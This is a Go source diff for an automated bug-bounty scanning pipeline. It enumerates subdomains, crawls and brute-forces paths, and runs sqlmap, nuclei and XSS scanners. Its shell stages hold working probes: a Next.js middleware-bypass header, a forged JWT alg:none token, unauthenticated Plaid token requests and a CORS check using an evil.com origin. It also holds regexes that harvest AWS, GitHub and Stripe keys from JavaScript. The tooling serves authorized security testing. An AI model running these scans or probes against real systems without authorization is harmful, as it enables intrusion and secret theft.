@@ -2,7 +2,10 @@ package pipeline
 
 import (
 	"context"
+	"crypto/sha256"
+	_ "embed"
 	"encoding/json"
+	"errors"
 	"fmt"
 	"os"
 	"os/exec"
@@ -60,30 +63,178 @@ type Step struct {
 	Timeout time.Duration
 }
 
+type StagePolicy string
+
+const (
+	PolicyRequired    StagePolicy = "required"
+	PolicyOptional    StagePolicy = "optional"
+	PolicyConditional StagePolicy = "conditional"
+)
+
+type StageContract struct {
+	Inputs          []string    `json:"inputs"`
+	Outputs         []string    `json:"outputs"`
+	Policy          StagePolicy `json:"policy"`
+	EmptyInputValid bool        `json:"empty_input_valid"`
+}
+
+//go:embed stage_contracts.json
+var stageContractData []byte
+
+var stageContracts map[string]StageContract
+
+func init() {
+	if err := json.Unmarshal(stageContractData, &stageContracts); err != nil {
+		panic(fmt.Sprintf("invalid embedded stage contracts: %v", err))
+	}
+}
+
+func commandDigest(command string) string {
+	return fmt.Sprintf("%x", sha256.Sum256([]byte(command)))
+}
+
+func writeStageRecordOrReport(workDir string, record coverage.StageRecord, errChan chan<- error) {
+	if err := coverage.WriteStageRecord(workDir, record); err != nil {
+		errChan <- fmt.Errorf("write stage record %s: %w", record.StageID, err)
+	}
+}
+
+func stageToolIdentity(tool string) string {
+	if tool == "" || tool == "findings-runner" || tool == "filter-testable" {
+		return selfBin()
+	}
+	path, err := exec.LookPath(tool)
+	if err != nil {
+		return "missing:" + tool
+	}
+	info, err := os.Stat(path)
+	if err != nil {
+		return path
+	}
+	return fmt.Sprintf("%s:%d:%d", path, info.Size(), info.ModTime().UnixNano())
+}
+
+func stageToolVersion(tool string) string {
+	path := tool
+	if tool == "findings-runner" || tool == "filter-testable" {
+		path = selfBin()
+	} else if resolved, err := exec.LookPath(tool); err == nil {
+		path = resolved
+	} else {
+		return "not_installed"
+	}
+	identity := stageToolIdentity(tool)
+	if cached, ok := toolVersionCache.Load(identity); ok {
+		return cached.(string)
+	}
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+	defer cancel()
+	if output, err := exec.CommandContext(ctx, "go", "version", "-m", path).CombinedOutput(); err == nil {
+		for _, line := range strings.Split(string(output), "\n") {
+			fields := strings.Fields(line)
+			if len(fields) >= 3 && fields[0] == "mod" {
+				return cacheToolVersion(identity, fields[1]+"@"+fields[2])
+			}
+		}
+	}
+	for _, args := range [][]string{{"--version"}, {"-version"}, {"version"}} {
+		ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
+		output, err := exec.CommandContext(ctx, path, args...).CombinedOutput()
+		cancel()
+		if err == nil {
+			for _, line := range strings.Split(strings.TrimSpace(string(output)), "\n") {
+				line = strings.TrimSpace(line)
+				if line != "" {
+					return cacheToolVersion(identity, line)
+				}
+			}
+		}
+	}
+	return cacheToolVersion(identity, "unreported")
+}
+
+func cacheToolVersion(identity, version string) string {
+	toolVersionCache.Store(identity, version)
+	return version
+}
+
+func stagePolicy(stageID string) StagePolicy {
+	return stageContracts[stageID].Policy
+}
+
+func recordHasSuccessfulStatus(status coverage.StageStatus) bool {
+	return status == coverage.StatusCompleted || status == coverage.StatusCompletedEmpty || status == coverage.StatusCompletedNoInput
+}
+
+func equalStrings(a, b []string) bool {
+	if len(a) != len(b) {
+		return false
+	}
+	for i := range a {
+		if a[i] != b[i] {
+			return false
+		}
+	}
+	return true
+}
+
+func allArtifactsExist(workDir string, paths []string) bool {
+	for _, path := range paths {
+		full := path
+		if !filepath.IsAbs(full) {
+			full = filepath.Join(workDir, full)
+		}
+		if _, err := os.Stat(full); err != nil {
+			return false
+		}
+	}
+	return true
+}
+
+func resumeRecordValid(workDir string, step Step, record coverage.StageRecord, depsComplete bool) bool {
+	inputs, outputs := stageArtifacts(step)
+	return depsComplete && record.CommandHash == commandDigest(step.Command) && record.ToolIdentity == stageToolIdentity(step.Tool) && record.ToolVersion == stageToolVersion(step.Tool) && equalStrings(record.InputContract, inputs) && equalStrings(record.OutputContract, outputs) && recordHasSuccessfulStatus(record.Status) && allArtifactsExist(workDir, outputs)
+}
+
 var (
-	uiLock sync.Mutex
+	uiLock           sync.Mutex
+	toolVersionCache sync.Map
 
 	stepTools = map[string]string{
-		"subfinder":           "subfinder",
-		"assetfinder":         "assetfinder",
-		"amass_enum":          "amass",
-		"crtsh":               "curl",
-		"scope_guard":         "awk",
-		"katana_crawl":        "katana",
-		"gau_urls":            "gau",
-		"wayback_urls":        "waybackurls",
-		"dirbrute_ffuf":       "ffuf",
-		"sqlmap_scan":         "sqlmap",
-		"xss_scan":            "dalfox",
-		"nuclei_exposures":    "nuclei",
-		"nuclei_misconfigs":   "nuclei",
-		"nuclei_auth_scan":    "nuclei",
-		"nuclei_graphql_scan": "nuclei",
-		"nuclei_rfuf_pass":    "nuclei",
-		"waf_detect":          "wafw00f",
-		"port_scan_naabu":     "naabu",
-		"hidden_params_arjun": "arjun",
-		"ghauri_sqli":         "ghauri",
+		"subfinder":              "subfinder",
+		"assetfinder":            "assetfinder",
+		"amass_enum":             "amass",
+		"crtsh":                  "curl",
+		"scope_guard":            "awk",
+		"dnsx_resolve":           "dnsx",
+		"subdomain_brute":        "dnsx",
+		"httpx_probe":            "httpx",
+		"tech_fingerprint":       "httpx",
+		"api_discovery":          "curl",
+		"url_filter_alive":       "httpx",
+		"ffuf_js_endpoints":      "ffuf",
+		"cors_check":             "curl",
+		"js_endpoints_scan":      "nuclei",
+		"dirbrute_verify_200":    "httpx",
+		"katana_crawl":           "katana",
+		"gau_urls":               "gau",
+		"wayback_urls":           "waybackurls",
+		"dirbrute_ffuf":          "ffuf",
+		"sqlmap_scan":            "sqlmap",
+		"xss_scan":               "dalfox",
+		"nuclei_exposures":       "nuclei",
+		"nuclei_misconfigs":      "nuclei",
+		"nuclei_auth_scan":       "nuclei",
+		"nuclei_graphql_scan":    "nuclei",
+		"nuclei_rfuf_pass":       "nuclei",
+		"waf_detect":             "wafw00f",
+		"port_scan_naabu":        "naabu",
+		"hidden_params_arjun":    "arjun",
+		"ghauri_sqli":            "ghauri",
+		"trufflehog_scan":        "trufflehog",
+		"nextjs_plaid_jwt_probe": "curl",
+		"drf_probe":              "curl",
+		"grep_secrets":           "grep",
 	}
 	softStages = map[string]bool{
 		"scope_guard":         true,
@@ -92,6 +243,8 @@ var (
 		"assetfinder":         true,
 		"amass_enum":          true,
 		"jsmap_scrape":        true,
+		"trufflehog_scan":     true,
+		"ffuf_js_endpoints":   true,
 		"hidden_params_arjun": true,
 		"katana_crawl":        true,
 		"merge_brute_subs":    true,
@@ -139,7 +292,12 @@ var (
 func selfBin() string {
 	exe, err := os.Executable()
 	if err != nil {
-		return "rfuf"
+		return ""
+	}
+	if !filepath.IsAbs(exe) {
+		if abs, absErr := filepath.Abs(exe); absErr == nil {
+			exe = abs
+		}
 	}
 	if resolved, err := filepath.EvalSymlinks(exe); err == nil {
 		return resolved
@@ -162,6 +320,8 @@ func buildAuthSqlmapCmd() string {
 SQLMAP_AUTH_ARGS=()
 [ -n "$RFUF_AUTH_COOKIE" ] && SQLMAP_AUTH_ARGS+=("--cookie=$RFUF_AUTH_COOKIE")
 [ -n "$RFUF_AUTH_HEADER" ] && SQLMAP_AUTH_ARGS+=("--header=$RFUF_AUTH_HEADER")
+[ -n "$RFUF_BUG_BOUNTY_USERNAME" ] && SQLMAP_AUTH_ARGS+=("--headers=X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME\\nX-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME")
+[ -n "$RFUF_TEST_ACCOUNT_EMAIL" ] && SQLMAP_AUTH_ARGS+=("--headers=X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL")
 `
 }
 
@@ -254,19 +414,24 @@ touch scope.json in_scope_hosts.txt out_of_scope_hosts.txt scoped_subs.txt`, "aw
 		{"dnsx_resolve", "dnsx -l scoped_subs.txt -silent -o live_subs.txt", "dnsx", "default", []string{"scope_guard"}, 0},
 		{"subdomain_brute", subdomainBruteCmd, "dnsx", "grep", []string{"dnsx_resolve"}, 0},
 		{"merge_brute_subs", "cat scoped_subs.txt brute_subs.txt | sort -u > subs_with_brute.txt && mv subs_with_brute.txt live_subs.txt", "cat", "default", []string{"subdomain_brute"}, 0},
-		{"httpx_probe", fmt.Sprintf("%s\nhttpx -l live_subs.txt -silent -status-code -title -tech-detect -o alive.txt", authSnip), "httpx", "default", []string{"merge_brute_subs"}, 0},
-		{"s3_audit_run", fmt.Sprintf("%s\n%s s3auditor .\nexit 0", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"httpx_probe"}, 0},
-		{"tech_fingerprint", "httpx -l alive.txt -silent -tech-detect -o tech_fingerprint.txt", "httpx", "default", []string{"httpx_probe"}, 0},
+		{"httpx_probe", fmt.Sprintf("%s\nhttpx -l live_subs.txt -silent -status-code -title -tech-detect \"${AUTH_HEADERS[@]}\" -o alive.txt", authSnip), "httpx", "default", []string{"merge_brute_subs"}, 0},
+		{"s3_audit_run", fmt.Sprintf("%s\n%s s3auditor .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"url_filter_alive"}, 0},
+		{"tech_fingerprint", fmt.Sprintf("%s\nawk '{print $1}' alive.txt | httpx -silent -tech-detect \"${AUTH_HEADERS[@]}\" -o tech_fingerprint.txt", authSnip), "httpx", "default", []string{"httpx_probe"}, 0},
 		{"api_discovery", fmt.Sprintf(`%s
 set +e
 mkdir -p api_specs
 fetch_spec() {
   HOST=$1
+  AUTH_HEADERS=()
+  [ -n "$RFUF_AUTH_COOKIE" ] && AUTH_HEADERS+=(-H "Cookie: $RFUF_AUTH_COOKIE")
+  [ -n "$RFUF_AUTH_HEADER" ] && AUTH_HEADERS+=(-H "Authorization: $RFUF_AUTH_HEADER")
+  [ -n "$RFUF_BUG_BOUNTY_USERNAME" ] && AUTH_HEADERS+=(-H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME")
+  [ -n "$RFUF_TEST_ACCOUNT_EMAIL" ] && AUTH_HEADERS+=(-H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL")
   SAFE_HOST=$(echo "$HOST" | sed 's|https\?://||;s|[:/.]|_|g')
   for SPEC_PATH in /openapi.json /swagger.json /api/openapi.json /api/swagger.json /sitemap.xml /robots.txt /.well-known/openid-configuration; do
     URL="${HOST}${SPEC_PATH}"
     OUT="api_specs/${SAFE_HOST}$(echo "$SPEC_PATH" | sed 's|^/||;s|/|_|g').json"
-    if curl -sk --max-time 5 -o "$OUT" "$URL" && [ -s "$OUT" ]; then
+    if curl -sk --max-time 5 "${AUTH_HEADERS[@]}" -o "$OUT" "$URL" && [ -s "$OUT" ]; then
       echo "[+] Found spec: $URL"
     fi
   done
@@ -274,67 +439,7 @@ fetch_spec() {
 export -f fetch_spec
 cat alive.txt | awk '{print $1}' | xargs -P 10 -I{} bash -c 'fetch_spec "{}"'
 exit 0`, authSnip), "curl", "default", []string{"httpx_probe"}, 0},
-		{"jsmap_scrape", fmt.Sprintf(`%s
-set +e
-mkdir -p js_bundles endpoints_found js_secrets
-: > js_assets.txt
-: > js_asset_errors.txt
-: > js_endpoints.txt
-: > js_secrets.txt
-fetch_asset() {
-  URL="$1"; OUT="$2"
-  mkdir -p "$(dirname "$OUT")"
-  curl -skL --max-time 15 "${AUTH_HEADERS[@]}" -o "$OUT" "$URL"
-  [ -s "$OUT" ]
-}
-resolve_asset() {
-  REF="$1"; BASE="$2"
-  case "$REF" in
-    https://*|http://*) printf '%%s\\n' "$REF" ;;
-    //* ) printf 'https:%%s\\n' "$REF" ;;
-    /* ) printf '%%s%%s\\n' "$(echo "$BASE" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')" "$REF" ;;
-    * ) printf '%%s/%%s\\n' "${BASE%%/}" "${REF#./}" ;;
-  esac
-}
-while read -r HOST; do
-  [ -n "$HOST" ] || continue
-  PREFIX=$(echo "$HOST" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
-  PAGE="js_bundles/${PREFIX}_page.html"
-  fetch_asset "$HOST" "$PAGE"
-  {
-    grep -oE 'src="[^"]+"|href="[^"]+"' "$PAGE" 2>/dev/null | sed -E 's/^[^=]+="//;s/"$//'
-    grep -oE "src='[^']+'|href='[^']+'" "$PAGE" 2>/dev/null | sed -E "s/^[^=]+='//;s/'$//"
-    printf '%%s\\n' /manifest.json /asset-manifest.json /manifest.webmanifest /build-manifest.json /routes-manifest.json /_next/build-manifest.json /_next/static/chunks/webpack.js /static/js/main.js
-  } | while read -r REF; do
-    [ -n "$REF" ] || continue
-    FULL=$(resolve_asset "$REF" "$HOST")
-    echo "$FULL" | grep -Eiq '\\.(js|mjs|map|json|webmanifest)([?#].*)?$|/(manifest|asset-manifest|build-manifest|routes-manifest)(\\.json)?([?#].*)?$|/_next/static/' || continue
-    echo "$FULL" >> js_assets.txt
-  done
-done < <(awk '{print $1}' alive.txt)
-sort -u js_assets.txt -o js_assets.txt
-head -n %d js_assets.txt > js_assets.capped && mv js_assets.capped js_assets.txt
-while read -r FULL_URL; do
-  [ -n "$FULL_URL" ] || continue
-  PREFIX=$(echo "$FULL_URL" | sed 's|https\\?://||;s|[^A-Za-z0-9._-]|_|g')
-  NAME=$(printf '%%s' "$FULL_URL" | md5sum | cut -d' ' -f1)
-  OUT="js_bundles/${PREFIX}_${NAME}.js"
-  echo "$FULL_URL" | grep -Eiq '\\.(json|webmanifest)([?#].*)?$|manifest|buildManifest' && OUT="js_bundles/${PREFIX}_${NAME}.json"
-  fetch_asset "$FULL_URL" "$OUT" || { echo "$FULL_URL" >> js_asset_errors.txt; continue; }
-  [ -s "$OUT" ] || continue
-  HOST_BASE=$(echo "$FULL_URL" | sed 's|\\(https\\?://[^/]*\\).*|\\1|')
-  {
-    grep -oE '"(/[A-Za-z0-9_./?&=-]+)"' "$OUT" 2>/dev/null | tr -d '"'
-    grep -oE "'/[A-Za-z0-9_./?&=-]+'" "$OUT" 2>/dev/null | tr -d "'"
-  } | while read -r PATH_CAND; do
-    case "$PATH_CAND" in /*) echo "$HOST_BASE$PATH_CAND" ;; esac
-  done >> "endpoints_found/${PREFIX}.txt"
-  grep -Eoh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-(test_|live_)?[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|xox[baprs]-[A-Za-z0-9-]{10,}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+)' "$OUT" 2>/dev/null | sort -u >> "js_secrets/${PREFIX}.txt"
-done < js_assets.txt
-cat endpoints_found/*.txt 2>/dev/null | sort -u | head -2000 > js_endpoints.txt
-cat js_secrets/*.txt 2>/dev/null | sort -u > js_secrets.txt
-printf 'assets=%%s errors=%%s endpoints=%%s\\n' "$(wc -l < js_assets.txt 2>/dev/null || echo 0)" "$(wc -l < js_asset_errors.txt 2>/dev/null || echo 0)" "$(wc -l < js_endpoints.txt 2>/dev/null || echo 0)" > jsmap_status.txt
-exit 0`, authSnip, jsAssetTotalCap), "grep", "grep", []string{"httpx_probe"}, 0},
+		{"jsmap_scrape", fmt.Sprintf("%s jsassets .", findingsRunnerRef), "findings-runner", "grep", []string{"httpx_probe"}, 0},
 		{"trufflehog_scan", `set +e
 : > trufflehog_results.txt
 : > trufflehog_stderr.log
@@ -369,33 +474,36 @@ grep -Eih '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|github_pat_[A-
 # Also scan JS bundles for embedded secrets (no URL false positives here)
 [ -s js_bundles/ ] && grep -Eroh '(AKIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|sk-(test_|live_)?[A-Za-z0-9]{24,}|AIza[0-9A-Za-z_-]{35}|eyJ[A-Za-z0-9_=-]+\.eyJ[A-Za-z0-9_=-]+\.[A-Za-z0-9_.+/=-]+|xox[baprs]-[A-Za-z0-9-]{10,}|sk_live_[A-Za-z0-9]{24,}|ya29\.[0-9A-Za-z_-]{50,})' js_bundles/ 2>/dev/null | sort -u >> js_secrets.txt
 exit 0`, "grep", "grep", []string{"katana_crawl", "jsmap_scrape"}, 0},
-		{"katana_crawl", fmt.Sprintf("head -n %d alive.txt > katana_targets.txt && katana -list katana_targets.txt -jc -kf all -d 2 -ct 10m -timeout 10 -iqp -o katana_urls.txt && sort -u katana_urls.txt -o clean_katana_urls.txt", katanaTargetCap), "katana", "default", []string{"httpx_probe"}, katanaStepTimeout},
+		{"katana_crawl", fmt.Sprintf("awk '{print $1}' alive.txt | head -n %d > katana_targets.txt && katana -list katana_targets.txt -jc -kf all -d 2 -ct 10m -timeout 10 -iqp -o katana_urls.txt && sort -u katana_urls.txt -o clean_katana_urls.txt", katanaTargetCap), "katana", "default", []string{"httpx_probe"}, katanaStepTimeout},
 		{"gau_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout %s cat live_subs.txt | gau --threads 5 --subs | tee gau_urls.txt", urlMinerTimeout), "gau", "default", []string{"merge_brute_subs"}, 10 * time.Minute},
 		{"wayback_urls", fmt.Sprintf("[ -s live_subs.txt ] && timeout %s cat live_subs.txt | waybackurls | tee wayback_urls.txt", urlMinerTimeout), "waybackurls", "default", []string{"merge_brute_subs"}, 10 * time.Minute},
-		{"spec_parser", "go run ./cmd/findings-runner specparser .", "findings-runner", "default", []string{"api_discovery"}, 0},
+		{"spec_parser", fmt.Sprintf("%s specparser .", findingsRunnerRef), "findings-runner", "default", []string{"api_discovery"}, 0},
 		{"merge_all_urls", `: > all_urls.txt
 touch gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt
 cat gau_urls.txt wayback_urls.txt clean_katana_urls.txt openapi_paths.txt 2>/dev/null | sort -u > all_urls.txt
 exit 0`, "cat", "default", []string{"gau_urls", "wayback_urls", "katana_crawl", "api_discovery", "spec_parser"}, 0},
-		{"uro_dedup", "if command -v uro >/dev/null 2>&1; then uro < all_urls.txt > uro_urls.txt; cp uro_urls.txt all_urls.txt; else sort -u all_urls.txt -o all_urls.txt; fi", "uro", "grep", []string{"merge_all_urls"}, 0},
+		{"uro_dedup", "sort -u all_urls.txt -o all_urls.txt; cp all_urls.txt uro_urls.txt", "sort", "grep", []string{"merge_all_urls"}, 0},
 		{"url_filter_alive", fmt.Sprintf(`%s
+grep -Ei '%s' all_urls.txt > all_urls_scope_candidates.txt || :
 if [ -n "$RFUF_EXCLUDE_URL_REGEX" ]; then
-  grep -Ev -- "$RFUF_EXCLUDE_URL_REGEX" all_urls.txt > all_urls_scannable.txt || cp all_urls.txt all_urls_scannable.txt
+  grep -Ev -- "$RFUF_EXCLUDE_URL_REGEX" all_urls_scope_candidates.txt > all_urls_scannable.txt || :
 else
-  cp all_urls.txt all_urls_scannable.txt
+  cp all_urls_scope_candidates.txt all_urls_scannable.txt
 fi
+rm -f all_urls_scope_candidates.txt
 httpx -l all_urls_scannable.txt -silent -status-code -mc 200,301,302,401,403,405,500 "${AUTH_HEADERS[@]}" > all_urls_status.txt
 grep -E " \[(200|301|302)\]" all_urls_status.txt | awk '{print $1}' > all_urls_200.txt
 grep -E " \[(401|403|500)\]" all_urls_status.txt > high_interest_urls.txt
-rm -f all_urls_status.txt`, authSnip), "httpx", "grep", []string{"uro_dedup", "merge_js_endpoints"}, 0},
-		{"nextjs_bypass_run", fmt.Sprintf("%s\ngo run ./cmd/findings-runner nextjsbypass .", authSnip), "findings-runner", "default", []string{"url_filter_alive"}, 0},
-		{"bypass403", "go run ./cmd/findings-runner bypass403 .", "findings-runner", "default", []string{"url_filter_alive"}, 0},
-		{"ffuf_js_endpoints", fmt.Sprintf(`if [ -s js_endpoints.txt ]; then
-		  ffuf -w js_endpoints.txt:URL -w %s:WORD -u "URL/WORD" -mc 200,301,302,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_js_results.json -of json -s
+rm -f all_urls_status.txt`, authSnip, wildcardPattern), "httpx", "grep", []string{"uro_dedup", "merge_js_endpoints"}, 0},
+		{"nextjs_bypass_run", fmt.Sprintf("%s\n%s nextjsbypass .", authSnip, findingsRunnerRef), "findings-runner", "default", []string{"url_filter_alive"}, 0},
+		{"bypass403", fmt.Sprintf("%s bypass403 .", findingsRunnerRef), "findings-runner", "default", []string{"url_filter_alive"}, 0},
+		{"ffuf_js_endpoints", fmt.Sprintf(`%s
+if [ -s js_endpoints.txt ]; then
+		  ffuf -w js_endpoints.txt:URL -w %s:WORD -u "URL/WORD" "${AUTH_HEADERS[@]}" -mc 200,301,302,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_js_results.json -of json -s
 		  jq -r ".results[]? | .url" ffuf_js_results.json 2>/dev/null >> js_endpoints.txt
 		  sort -u js_endpoints.txt -o js_endpoints.txt
 		fi
-		exit 0`, wordlist), "ffuf", "default", []string{"jsmap_scrape"}, 0},
+		exit 0`, authSnip, wordlist), "ffuf", "default", []string{"jsmap_scrape"}, 0},
 		{"merge_js_endpoints", `set +e
 						cat js_endpoints.txt 2>/dev/null | grep -E '^https?://' | sort -u > js_endpoints_full.txt
 						cat all_urls.txt js_endpoints_full.txt 2>/dev/null | grep -E '^https?://' | sort -u > all_urls_with_js.txt
@@ -501,9 +609,14 @@ sort -u lfi_targets.txt -o lfi_targets.txt
 exit 0`, filterTestableRef), "filter-testable", "grep", []string{"scope_filter"}, 0},
 		{"lfi_scan", fmt.Sprintf("%s\nnuclei -l lfi_targets.txt -tags lfi %s \"${AUTH_HEADERS[@]}\" -o lfi_results.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"lfi_targets"}, 0},
 		{"cors_check", `set +e
-head -n 500 alive.txt | xargs -P 20 -I{} sh -c '
+awk '{print $1}' alive.txt | head -n 500 | xargs -P 20 -I{} bash -c '
+  AUTH_HEADERS=()
+  [ -n "$RFUF_AUTH_COOKIE" ] && AUTH_HEADERS+=(-H "Cookie: $RFUF_AUTH_COOKIE")
+  [ -n "$RFUF_AUTH_HEADER" ] && AUTH_HEADERS+=(-H "Authorization: $RFUF_AUTH_HEADER")
+  [ -n "$RFUF_BUG_BOUNTY_USERNAME" ] && AUTH_HEADERS+=(-H "X-Bug-Bounty: $RFUF_BUG_BOUNTY_USERNAME" -H "X-HackerOne-Research: $RFUF_BUG_BOUNTY_USERNAME")
+  [ -n "$RFUF_TEST_ACCOUNT_EMAIL" ] && AUTH_HEADERS+=(-H "X-Test-Account-Email: $RFUF_TEST_ACCOUNT_EMAIL")
   ORIGIN="https://evil.com"
-  RESP=$(curl -sk --max-time 5 --connect-timeout 3 -H "Origin: $ORIGIN" -H "Access-Control-Request-Credentials: true" -I "{}" 2>/dev/null)
+  RESP=$(curl -sk --max-time 5 --connect-timeout 3 "${AUTH_HEADERS[@]}" -H "Origin: $ORIGIN" -H "Access-Control-Request-Credentials: true" -I "{}" 2>/dev/null)
   ACAO=$(echo "$RESP" | grep -i "^access-control-allow-origin:" | tr -d "\r" | awk "{print \$2}")
   ACAC=$(echo "$RESP" | grep -i "^access-control-allow-credentials:" | tr -d "\r" | awk "{print \$2}")
   if [ -n "$ACAO" ] && [ "$ACAO" != "$ORIGIN" ]; then
@@ -515,31 +628,33 @@ head -n 500 alive.txt | xargs -P 20 -I{} sh -c '
   fi
 ' 2>/dev/null > cors_findings.txt
 exit 0`, "curl", "grep", []string{"httpx_probe"}, 0},
-		{"dirbrute_ffuf", fmt.Sprintf(`mkdir -p ffuf_results
+		{"dirbrute_ffuf", fmt.Sprintf(`%s
+mkdir -p ffuf_results
 if [ -n "%s" ] && [ -s alive.txt ]; then
-  ffuf -w alive.txt:HOST -w %s:WORD -u "HOST/WORD" -e .bak,.old,.swp,.zip,.sql,.git/config -mc 200,201,204,301,302,307,308,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_results/all.json -of json -s
+  awk '{print $1}' alive.txt > ffuf_targets.txt
+	  ffuf -w ffuf_targets.txt:HOST -w %s:WORD -u "HOST/WORD" "${AUTH_HEADERS[@]}" -e .bak,.old,.swp,.zip,.sql,.git/config -mc 200,201,204,301,302,307,308,401,403,405 -ac -t 30 -maxtime 1200 -recursion -recursion-depth 1 -o ffuf_results/all.json -of json -s
   jq -r ".results[]? | .url" ffuf_results/all.json 2>/dev/null >> ffuf_dirs_raw.txt
   sort -u ffuf_dirs_raw.txt -o ffuf_dirs_raw.txt
-fi
-exit 0`, wordlist, wordlist), "ffuf", "default", []string{"httpx_probe"}, 0},
+		fi
+		exit 0`, authSnip, wordlist, wordlist), "ffuf", "default", []string{"httpx_probe"}, 0},
 		{"dirbrute_verify_200", "if [ -s ffuf_dirs_raw.txt ]; then httpx -l ffuf_dirs_raw.txt -silent -status-code -mc 200 -o ffuf_dirs_200.txt; else : > ffuf_dirs_200.txt; fi", "httpx", "grep", []string{"dirbrute_ffuf"}, 0},
 		{"js_endpoints_scan", fmt.Sprintf("%s\nnuclei -l js_endpoints.txt -tags exposure,token-spray,misconfig %s \"${AUTH_HEADERS[@]}\" -o js_endpoint_findings.txt", authSnip, nucleiOptimized), "nuclei", "grep", []string{"merge_js_endpoints"}, 0},
-		{"nextjs_plaid_jwt_probe", `set +e
+		{"nextjs_plaid_jwt_probe", buildAuthHeaderSnippet() + `
 : > nextjs_plaid_jwt_findings.txt
 
 # Detect Next.js hosts from tech_fingerprint.txt or _next URL prefix
-NEXTJS_HOSTS=$( (grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}'; grep -hE "/_next/" all_urls.txt 2>/dev/null | sed 's|/.*||' | sort -u) | sort -u)
+NEXTJS_HOSTS=$(grep -E "nextjs," tech_fingerprint.txt 2>/dev/null | awk '{print $1}' | sort -u)
 
 while read HOST; do
   [ -z "$HOST" ] && continue
-  echo "=== $HOST ===" >> nextjs_//plaid_jwt_findings.txt
+	  echo "=== $HOST ===" >> nextjs_plaid_jwt_findings.txt
 
   # 1. Next.js middleware bypass (CVE-2025-29927). The bypass header is
   #    x-middleware-subrequest with the value 'middleware:middleware:middleware:middleware:middleware'.
   #    We probe both a likely-auth-protected path and the index.
   for PATH in /dashboard /api /admin /settings /account /internal /me /api/user; do
-    BASELINE=$(curl -sk --max-time 6 -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
-    BYPASS=$(curl -sk --max-time 6 -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+  BASELINE=$(curl -sk --max-time 6 "${AUTH_HEADERS[@]}" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
+    BYPASS=$(curl -sk --max-time 6 "${AUTH_HEADERS[@]}" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -o /dev/null -w "%{http_code}" "$HOST$PATH" 2>/dev/null)
     if [ "$BASELINE" != "$BYPASS" ] && [ "$BYPASS" = "200" ] && [ "$BASELINE" != "200" ]; then
       echo "[CRITICAL] $HOST$PATH — Next.js middleware bypass: baseline=$BASELINE bypass=$BYPASS" >> nextjs_plaid_jwt_findings.txt
     fi
@@ -547,7 +662,7 @@ while read HOST; do
 
 	  # 2. Plaid endpoint probe. The Plaid Link flow exposes these paths.
   for ENDPOINT in /plaid/link/token/create /plaid/exchange_public_token /api/plaid/link/token/create /api/plaid/exchange_public_token /plaid_link_token /api/plaid_link_token /auth/refresh-token /api/auth/refresh-token /auth/refresh_token /api/auth/refresh_token /exchange_plaid_token /api/exchange_plaid_token; do
-    CODE=$(curl -sk --max-time 6 -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+    CODE=$(curl -sk --max-time 6 "${AUTH_HEADERS[@]}" -X POST -H "Content-Type: application/json" -d '{}' -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
     if [ "$CODE" = "200" ]; then
       echo "[HIGH] $HOST$ENDPOINT — Plaid/auth-token endpoint returns 200 unauthenticated" >> nextjs_plaid_jwt_findings.txt
     fi
@@ -556,7 +671,7 @@ while read HOST; do
   # 3. JWT alg:none. Forge a header.alg=none token with empty signature.
   JWT_NONE='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.'
   for ENDPOINT in /api/me /api/user /api/admin /api/v1/me /api/v2/me /api/v3/me /account /me; do
-    CODE=$(curl -sk --max-time 6 -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
+    CODE=$(curl -sk --max-time 6 "${AUTH_HEADERS[@]}" -H "Authorization: Bearer $JWT_NONE" -o /dev/null -w "%{http_code}" "$HOST$ENDPOINT" 2>/dev/null)
     case "$CODE" in
       200) echo "[CRITICAL] $HOST$ENDPOINT — JWT alg:none accepted (200)" >> nextjs_plaid_jwt_findings.txt ;;
     esac
@@ -671,21 +786,21 @@ exit 0`, "wafw00f", "grep", []string{"httpx_probe"}, 0},
 		{"port_scan_naabu", "if command -v naabu >/dev/null 2>&1; then naabu -list alive.txt -top-ports 1000 -rate 1000 -silent -o naabu_ports.txt; else : > naabu_ports.txt; fi", "naabu", "grep", []string{"httpx_probe"}, 0},
